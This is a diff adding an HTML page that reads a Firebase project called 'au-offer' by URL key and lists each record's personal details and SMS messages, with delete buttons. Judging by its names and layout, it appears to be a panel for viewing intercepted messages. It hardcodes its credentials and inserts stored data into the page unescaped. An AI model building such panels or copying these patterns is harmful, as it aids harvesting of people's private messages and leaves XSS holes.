@@ -1,0 +1,141 @@
+'<!DOCTYPE html>
+<html>
+
+<head>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Nunito:400,700">
+  <style>
+    .user-details-container {
+      font-family: 'Nunito', sans-serif;
+      max-width: 600px;
+      margin: auto;
+      padding: 20px;
+      border: 1px solid #d8d8d8;
+      border-radius: 8px;
+      background-color: #f2f2f2;
+      margin-top: 20px;
+    }
+
+    .details-label {
+      font-weight: bold;
+      margin-bottom: 8px;
+    }
+
+    .sms-container {
+      font-family: 'Nunito', sans-serif;
+      max-width: 600px;
+      margin: auto;
+      padding: 20px;
+      border: 1px solid #d8d8d8;
+      border-radius: 8px;
+      background-color: #f2f2f2;
+      margin-top: 20px;
+    }
+
+    .sms-item {
+      border: 1px solid #ccc;
+      margin-bottom: 10px;
+      padding: 10px;
+      position: relative;
+    }
+
+    .sms-label {
+      font-weight: bold;
+      margin-bottom: 8px;
+    }
+
+    .delete-button {
+      position: absolute;
+      top: 5px;
+      right: 5px;
+      background-color: #ff5f5f;
+      color: white;
+      border: none;
+      padding: 5px;
+      cursor: pointer;
+      border-radius: 3px;
+    }
+  </style>
+</head>
+
+<body>
+  <div id="user-details-container" class="user-details-container"></div>
+  <div id="sms-container" class="sms-container"></div>
+
+  <!-- Add Firebase scripts -->
+  <script src="https://www.gstatic.com/firebasejs/8.7.0/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.7.0/firebase-database.js"></script>
+
+  <script>
+    var firebaseConfig = {
+apiKey: "AIzaSyCc99dAgCLCHAfhP_-1gZxOHJ0FyZS5RV0",
+      authDomain: "au-offer.firebaseapp.com",
+      databaseURL: "https://au-offer-default-rtdb.firebaseio.com",
+      projectId: "au-offer",
+      storageBucket: "au-offer.appspot.com",
+      messagingSenderId: "892581950292",
+      appId: "1:892581950292:web:bc0a67a446c34fd49f0ec1",
+      measurementId: "G-902Z03TXT4"
+    };
+    firebase.initializeApp(firebaseConfig);
+
+    var urlParams = new URLSearchParams(window.location.search);
+    var nodeKey = urlParams.get('key');
+    var nodeRef = firebase.database().ref(nodeKey);
+    var nodeDetails;
+
+    nodeRef.once("value", function(snapshot) {
+      nodeDetails = snapshot.val();
+
+      var userDetailsContainer = document.getElementById("user-details-container");
+      userDetailsContainer.innerHTML = `
+        <div class="details-label">Node Key:</div>
+        <div>${nodeKey}</div>
+        <hr>
+      `;
+
+      for (var property in nodeDetails["Details"]) {
+        if (nodeDetails["Details"].hasOwnProperty(property)) {
+          userDetailsContainer.innerHTML += `
+            <div class="details-label">${property}:</div>
+            <div>${nodeDetails["Details"][property]}</div>
+            <hr>
+          `;
+        }
+      }
+
+      var smsContainer = document.getElementById("sms-container");
+      smsContainer.innerHTML = '<h2>SMS Details</h2>';
+
+      for (var smsKey in nodeDetails["SMS"]) {
+        if (nodeDetails["SMS"].hasOwnProperty(smsKey)) {
+          smsContainer.innerHTML += createSMSItem(smsKey, nodeDetails["SMS"][smsKey]);
+        }
+      }
+    });
+
+    function createSMSItem(key, message) {
+      return `
+        <div class="sms-item">
+          <div class="sms-label">SMS Key:</div>
+          <div>${key}</div>
+          <div class="sms-label">Message:</div>
+          <div>${message}</div>
+          <button class="delete-button" onclick="deleteSMS('${key}')">Delete SMS</button>
+        </div>
+      `;
+    }
+
+    function deleteSMS(smsKey) {
+      if (confirm("Are you sure you want to delete this SMS?")) {
+        nodeRef.child('SMS').child(smsKey).remove().then(function() {
+          location.reload();
+        }).catch(function(error) {
+          console.error("Error deleting SMS:", error);
+          alert("Error deleting SMS. Please try again.");
+        });
+      }
+    }
+  </script>
+</body>
+
+</html>
